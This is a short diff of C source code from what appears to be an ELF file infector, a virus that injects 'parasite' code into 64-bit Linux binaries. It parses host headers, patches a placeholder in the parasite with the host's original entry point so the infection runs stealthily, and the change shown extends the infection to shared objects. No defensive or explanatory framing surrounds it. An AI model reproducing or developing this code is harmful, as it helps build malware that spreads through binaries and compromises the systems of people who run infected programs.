@@ -87,13 +87,12 @@ void ElfParser(char *filepath)
 	void *host_mapping = mmapFile(filepath);
 
 
-	// SKIP Relocatable, files and 32-bit class of binaries
+	// Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
 	Elf64_Ehdr *host_header = (Elf64_Ehdr *) host_mapping;
     if ( host_header->e_type == ET_REL ||
          host_header->e_type == ET_CORE ) return;
 	else if ( host_header->e_type == ET_EXEC ){	HOST_IS_EXECUTABLE = 1; HOST_IS_SHARED_OBJECT = 0;}
 	else if ( host_header->e_type == ET_DYN  ){	HOST_IS_SHARED_OBJECT = 1; HOST_IS_EXECUTABLE = 0;}
-
     if ( host_header->e_ident[EI_CLASS] == ELFCLASS32 ) return;
 
 	
@@ -136,7 +135,8 @@ void ElfParser(char *filepath)
 	//						stealthily.						
 	if (HOST_IS_EXECUTABLE) FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
 	else if (HOST_IS_SHARED_OBJECT) {
-	//	FindAndReplace();
+		// Different case for SO - In case our parasite has more placeholders for so infection.
+		FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
 	}
 		
 	// ????????????????????????????????????????????????????????????????????????????????????????????
